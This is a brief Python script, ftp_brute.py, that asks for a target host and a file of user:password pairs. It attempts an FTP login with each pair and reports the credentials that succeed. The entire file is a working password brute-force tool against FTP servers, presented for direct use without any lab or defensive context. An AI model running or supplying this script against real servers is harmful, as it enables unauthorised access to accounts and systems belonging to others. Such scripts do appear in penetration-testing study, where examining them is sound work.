#!/usr/bin/python3

import os
import sys
import ftplib
import pexpect
import inspect
import subprocess
from termcolor import colored


"""Program: ftp_brute.py"""


def lineno():
    return inspect.currentframe().f_back.f_lineno


def login(host, user, pawd):
    try:
        ftp = ftplib.FTP(host, timeout=5)
        ftp.login(user, pawd)
        print(colored(f"{user}/{pawd} login to {host} successful!", 'green'))
        ftp.quit
    except ftplib.all_errors as e:
        print(colored(f"{e}", 'red'))


def read_file(host, pwd_file):
    try:
        with open(pwd_file) as file:
            for line in file.readlines():
                (user, password) = line.split(':')
                password = password.strip()
                print(colored(f"Trying {user}/{password}", 'yellow'))
                login(host, user, password)
    except Exception as e:
        print(colored(f"{e}", 'red'))


def main():
    subprocess.call('clear', shell=True)

    host = input(colored("Enter the host IP address: ", 'yellow'))
    pwd_file = input(colored("Enter password file name: ", 'yellow'))

    read_file(host, pwd_file)

if __name__ == "__main__":
    main()
